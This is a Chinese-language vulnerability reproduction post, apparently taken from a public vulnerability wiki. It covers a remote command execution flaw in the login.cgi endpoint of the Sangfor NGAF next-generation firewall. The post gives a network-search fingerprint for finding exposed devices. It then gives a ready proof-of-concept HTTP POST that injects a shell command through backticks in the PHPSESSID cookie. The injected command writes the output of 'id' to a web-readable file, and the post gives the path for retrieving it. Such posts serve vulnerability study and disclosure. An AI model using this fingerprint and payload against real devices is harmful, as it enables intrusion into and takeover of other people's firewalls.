---
title: "深信服 NGAF下一代防火墙 login.cgi 远程命令执行漏洞"
date: 2026-10-18 09:16:23
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "深信服"
tags:
  - "深信服"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。深信服下一代防火墙在 login.cgi 路径下，PHPSESSID 处存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

## 漏洞影响

深信服 NGAF下一代防火墙

## 网络测绘

```
"Redirect.php?url=LogInOut.php"
```

## 漏洞复现

登陆页面

![image-20231115101204343](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231115101204343.png)

poc

```
POST /cgi-bin/login.cgi HTTP/1.1 
Host: 
Cache-Control: max-age=0 
Content-Type: Application/X-www-Form
y-forwarded-for: 127.0.0.1
Cookie: PHPSESSID=`$(id > /fwlib/sys/virus/webui/svpn_html/3.txt)`;

{"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "NSLB" , "privacy_enable": "0"}}
```

![image-20231115101222783](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231115101222783.png)

访问

```
/svpn_html/3.txt
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E6%B7%B1%E4%BF%A1%E6%9C%8D-NGAF%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
